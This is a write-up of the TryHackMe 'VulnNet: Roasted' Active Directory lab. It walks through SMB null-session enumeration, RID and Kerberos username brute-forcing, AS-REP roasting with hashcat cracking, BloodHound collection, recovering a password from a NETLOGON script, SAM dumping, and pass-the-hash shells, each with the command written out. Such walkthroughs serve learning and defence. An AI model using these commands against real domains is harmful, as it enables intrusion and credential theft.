# hacking vulnnet:roasted (thm)

The **vulnnet:roasted** machine on [thm](https://tryhackme.com) gives us a great opportunity to mess around with active directory attacks.

---

## port scanning

We begin with an nmap scan of all the ports using tcp:

`ports64=$(sudo nmap -n -Pn -p- --min-rate=250 -sS --open 10.10.180.64 | grep ^[0-9] | cut -d '/' -f 1 -tr '\n' ',' | sed s/,$//)`

`echo $ports64 > p64.txt`

This shows us that port 88 is open which suggests that the target machine is a domain controller for a windows domain since port 88 is used by domain controllers for kerberos traffic.

![nmap scan result one](/images/1.png)

> [!NOTE]
> Domain Controllers are high value targets and must be pwned at all costs

A domain in windows is just a collection of objects such as users and computers which are administered together. Domains are used everywhere as they let organizations easily manage their assets and up scale if they want to.

Active directory is like a catalogue of all the objects in the domain and a domain controller is a server which runs active directory services. The long and short of this is this - domain controllers are high value targets as they contain lots of useful data (including password hashes 😈) for us to loot and mess with.

Domain controllers have port 88 open as this is the port which is used by kerberos. Kerberos :dog::dog::dog: is the main authorisation method used in active directory environments. The domain controller stores user data (including those password hashes :smiling_imp:) and therefore lots of authentication queries are made to the domain controller via kerberos over port 88.

We now try probing the open ports more using nmap:

`sudo nmap -Pn -n -p$ports64 -sV -A 10.10.180.64`

![nmap scan two](/images/2.png)

As is normal for a machine running windows, we see that smb is being used on port 445. It is usually a good idea to enumerate smb so this is what we will do next.

---

## smb enumeration

First of all, we can use smbclient to see if null sessions are allowed - we find that they are:

`sudo smbclient -N -L \\\\10.10.180.64\\`

![smbclient](/images/3.png)

We can find out more about the available shares using smbmap. Sometimes we don't need to specify any username:password combinations and we can retrieve data, but this time that won't work so we need to give the username *guest* and leave the password as a blank string. 

`sudo smbmap -H 10.10.180.64 -u "guest" -p ""`

Using this combo we see that we have read access to the IPC$ share along with two custom shares called *VulnNet-Business-Anonymous* and *VulNet-Enterprise-Anonymous*

![smbmap](/images/4.png)

Since it's always nice to know other tools 🛠️ that do the job, I tried using crackmapexec to have a look at the shares, too:

`sudo crackmapexec smb 10.10.212.255 -u "guest" -p "" --shares`

![crackmapexec one](/images/4b.png)

The IPC$ share is useful to have read access to as it is used to let anonymous users enumerate a domain. It is a good idea to use this to our advantage in order to try and find some valid usernames.

---

## enumerating usernames

We can use crackmapexec to do this using the `--rid-brute` switch:

`sudo crackmapexec smb 10.10.180.64 -u "guest" -p "" --rid-brute`

![brute force usernames](/images/5.png)

The impacket suite of tools has a way to do this, too - it is the `lookupsid.py` program. I used this to enumerate usernames. I then used a bit of bash to create a txt file with just the names.

`sudo python3 lookupsid.py vulnnet-rst.local/guest@10.10.212.255 | grep -i 'SidTypeUser' | cut -d '\' -f 2 | awk{'print $1'} > users.txt`

![brute force usernames](/images/6.png)

![brute force usernames](/images/7.png)

![brute force usernames](/images/8.png)

![brute force usernames](/images/9.png)

Before going on to the next part of the attack chain for this box, I want to focus on another way we can enumerate usernames

> [!NOTE]
> Getting valid usernames is half the battle when it comes to credentials


---

## kerbrute

On this box, we are able to retrieve valid usernames via the smb share, but what if we can't do that?

One way we can go is to first of all harvest employee  names - this is usually easy since websites for organizations usually have an *about us* or *meet the team* kind of page. We can lift employee names from these webpages since they are often given alongside pictures of very happy looking workers loving their jobs.

On this box, such cheery webpages are not provided :relieved: but we can retrieve the names of four employees by enumerating the smb shares more deeply. We can find txt files which contain the names of employees:

`sudo smbmap -H 10.10.212.255 -u 'guest' -p '' -r 'VulnNet-Business-Anonymous'`

![smb shares](/images/10.png)

We can then download the files:

`sudo smbmap -H 10.10.212.255 -u 'guest' -p '' --download 'VulnNet-Business-Anonymous\Business-Manager.txt'`

![smb shares](/images/11.png)

It doesn't really matter how we get employee names, just so long as we get them. We can then create a txt file which contains the harvested names.

![smb shares](/images/11b.png)

I tend to use lowercase letters as kerberos is case insensitive.

We can now mangle the names to come up with combinations which are commonly used by organizations when they are creating active directory usernames for their employees.

I wrote a python program to do this - it creates the most common combinations used for active directory usernames so as to be more efficient. It takes a txt file of first and second names and then spits out a txt file which is filled with mangled names. The source code is included in the repo as `usergen.py`

![name mangling](/images/11c.png)

Once we have a list of mangled usernames, we can feed them to kerbrute. This is a great tool which uses kerberos to enumerate valid usernames. It does not lock out accounts and since it is written in go it is very fast.

`sudo ./kerbrute userenum --dc 10.10.20.56 -d VULNNET-RST.local mangled_users.txt`

![kerbrute](/images/11d.png)

Using enumeration, a python program and kerbrute, we end up with some valid usernames. This is just another way to find them if other means are not available or are not working.

The next step is to use the usernames to somehow get further access to the domain. One attack we can try is ~~ass roasting~~ as-rep roasting :fire: 

---

## as-rep roasting

> [!CAUTION]
> Boring active directory stuff ahead...

When a user sends a request to the key distribution center for a ticket granting ticket, they usually need to prove who they are by including their username and a timestamp which have been encrypted using a key which has been derived from their password.

This is a form of pre-authentication and it is a security feature of kerberos. If it were not there, an attacker would be able to send a fake authentication request and recieve a ticket granting ticket from the key distribution center. This ticket granting ticket would include some data which has been encrypted with the user's key (password hash). The attacker would then be able to get a hold of the password hash of the victim user from this returned data and subsequently try to crack it offline in order to obtain the plaintext password.

Pre-authorization is therefore a useful security 🔐 feature of kerberos, but it is sometimes disabled 👍 This might be necessary if, for example, a user needs to authenticate to an app which does not support kerberos pre-authentication.

Armed with a list of usernames, we can check each one to see if they have kerberos pre-authentication disabled. A good tool to use is *GetNPUsers.py* from the impacket suite.

When I tried using this tool to perform an as-rep roasting attack, I found one user was vulnerable to it. I therefore obtained a copy of their password hash in the returned data.

`sudo python3 GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.212.255 -usersfile users.txt -no-pass -request -outputfile krb_hashes_1.txt`

![hashes](/images/12.png)

We can now attempt to crack this hash using hashcat with a mode of 18200:

`sudo hashcat -a 0 -m 18200 krb_hashes_1.txt rockyou.txt -O`

![hashcracking](/images/13.png)

The hash is cracked successfully and we obtain a password for the *t-skid* user 😃

![password](/images/14.png)

With a valid set of credentials, I decided to use bloodhound to enumerate the box more. I was specifically looking for domain admin users.

> [!NOTE]
> This step is not necessary but it is good to learn more about bloodhound

---

## bloodhound

After starting *neo4j* and *bloodhound*, I used an ingestor to obtain data about the target domain.

`sudo bloodhound-python -d vulnnet-rst.local -u t-skid -p '<REDACTED>' -ns 10.10.212.255 -c all`

![ingestor](/images/15.png)

I then uploaded the data and found that the *a-whitehat* user was a domain admin - we now can focus our attention on compromising *a-whitehat* :slightly_smiling_face:

![bloodhound](/images/16.png)
![bloodhound](/images/17.png)

With nothing much else to go on, we can go back to enumerating smb but this time using the valid credentials we have obtained.

---

## Enumerating SMB (again)

`sudo smbmap -H 10.10.212.255 -u 't-skid' -p <REDACTED>`

The *t-skid* user has more access to the shares, and we soon find an interesting *vbs* file which contains just what we are looking for - a way to compromise the domain admin user known as *a-whitehat* :smiley:

![smb](/images/18.png)

`sudo smbmap -H 10.10.212.255 -u 't-skid' -p <REDACTED> -r 'NETLOGON'`

Here we see the *ResetPassword.vbs* file :facepalm:

![smb](/images/19.png)

`sudo smbmap -H 10.10.212.255 -u 't-skid' -p <REDACTED> --download 'NETLOGON\ResetPassword.vbs'`

A nice discovery! :thumbsup:

![smb](/images/20.png)

![smb](/images/21.png)

---

## Looting the SAM Database

The next step is to check if the password is valid - it could be that the *a-whitehat* user changed their password after it was reset. I used *crackmapexec* to check if the password was still valid - it was :gift: - I then dumped the sam database using the same tool.

`sudo crackmapexec smb 10.10.212.255 -u 'a-whitehat' -d 'VULNNET-RST.local -p <REDACTED>' --sam`

![cme](/images/22.png)

> [!TIP]
> Always change your passwords from default or given values :roll_eyes:

---

## Getting Root

Armed with a hash for the Administrator user, I tried getting a shell using a *psexec* tool from *impacket* but it did not work so I tried the *wmiexec* tool which did work. I was able to use this shell to grab the user and system flags :smile:

`sudo python3 wmiexec.py "Administrator":@10.10.168.123 -hashes 'aad...09d'`

![wmiexec](/images/23.png)

![wmiexec](/images/24.png)

![wmiexec](/images/25.png)

The box was pwned :skull: and I was happy because I'd had some fun hacking a domain controller :partying_face:

---

## PS

The wmiexec shell is slow and limited, so it is worth noting that we can get a better shell using *winrm*

`sudo evil-winrm -u Administrator -H 'c25...09d' -i -N`

> [!IMPORTANT]
> We only use the NT hash with evil-winrm - the second part of the full NTLM hash

![winrm](/images/26.png)

---

## Credits

Thank you to [SkyWaves](https://tryhackme.com/p/SkyWaves) for creating the room, and thank you to *you* for reading my writeup of it :fist:
